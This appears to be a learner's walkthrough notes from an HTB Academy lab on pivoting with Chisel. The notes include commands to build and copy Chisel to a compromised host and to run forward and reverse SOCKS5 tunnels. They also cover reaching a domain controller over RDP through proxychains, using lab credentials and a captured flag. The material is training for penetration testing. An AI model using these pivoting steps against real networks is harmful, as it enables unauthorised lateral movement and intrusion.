# SOCKS5 Tunneling with Chisel

Chisel is a TCP/UDP-based tunneling tool written in Go that uses HTTP to transport data that is secured using SSH.

## Setting Up & Using Chisel

1) Cloning Chisel

git clone https://github.com/jpillora/chisel.git

2) Building the Chisel Binary

cd chisel
go build

3) Transferring Chisel Binary to Pivot Host

scp chisel ubuntu@$TARGET:~/

4) Running the Chisel Server on the Pivot Host

cd chisel
./chisel server -v -p 1234 --socks5

2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234

5) Connecting to the Chisel Server

On our attack host :
./chisel client -v $TARGET:1234 socks

6) Editing & Confirming proxychains.conf

On our attack host :
tail -f /etc/proxychains.conf
\# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080

7) Pivoting to the DC

proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

## Chisel Reverse Pivot

If firewall rules restrict inbound connections to our compromised target

1) Starting the Chisel Server on our Attack Host

sudo ./chisel server --reverse -v -p 1234 --socks5

2) Connecting the Chisel Client to our Attack Host

./chisel client -v 10.10.14.17:1234 R:socks

3) Editing & Confirming proxychains.conf

On our attack host :
tail -f /etc/proxychains.conf 
socks5 127.0.0.1 1080 

4) Pivoting to the DC

proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

## LAB

git clone https://github.com/jpillora/chisel.git

cd chisel
go build

scp chisel ubuntu@$TARGET:~/
HTB_@cademy_stdnt!

ssh ubuntu@$TARGET
HTB_@cademy_stdnt!

./chisel server -v -p 1234 --socks5

cd chisel
./chisel client -v $TARGET:1234 socks

2023/11/26 07:39:45 client: tun: proxy#127.0.0.1:1080=>socks: Listening

sudo vi /etc/proxychains.conf
MAJ+G
\# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080

proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

type C:\Users\victor\Documents\flag.txt.txt
Th3$eTunne1$@rent8oring!

proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

cd chisel
go build